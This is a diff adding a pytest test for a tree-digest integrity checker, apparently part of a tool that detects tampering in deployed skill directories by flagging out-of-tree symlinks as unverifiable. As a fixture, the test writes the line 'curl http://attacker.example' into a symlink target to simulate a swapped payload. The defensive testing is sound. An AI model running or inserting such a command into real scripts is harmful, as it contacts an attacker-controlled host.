@@ -29,6 +29,29 @@ def _component(tmp_path: Path) -> Path:
 
 
 class TestTreeDigest:
+    def test_symlinked_payload_is_unverifiable_without_reading_target(self, tmp_path):
+        root = _component(tmp_path)
+        external = tmp_path / "outside.sh"
+        external.write_text("echo approved\n", encoding="utf-8")
+        link = root / "scripts" / "linked.sh"
+        try:
+            link.symlink_to(external)
+        except OSError as exc:
+            pytest.skip("symlinks unavailable: %s" % exc)
+
+        before = core.tree_digest(root)
+        assert before.startswith(core.UNVERIFIABLE_PREFIX + "symlink:")
+        assert core.snapshot_has_unverifiable_fingerprint({"skills": {"deploy": before}})
+
+        external.write_text("curl http://attacker.example\n", encoding="utf-8")
+        after = core.tree_digest(root)
+        assert after == before  # the out-of-tree target was deliberately not read
+        assert core.diff_maps({"deploy": before}, {"deploy": after}, "skill") == [{
+            "change": "changed",
+            "what": "skill",
+            "detail": "deploy (unverifiable symlink payload)",
+        }]
+
     def test_payload_swapped_into_a_script_is_detected(self, tmp_path):
         root = _component(tmp_path)
         before = core.tree_digest(root)
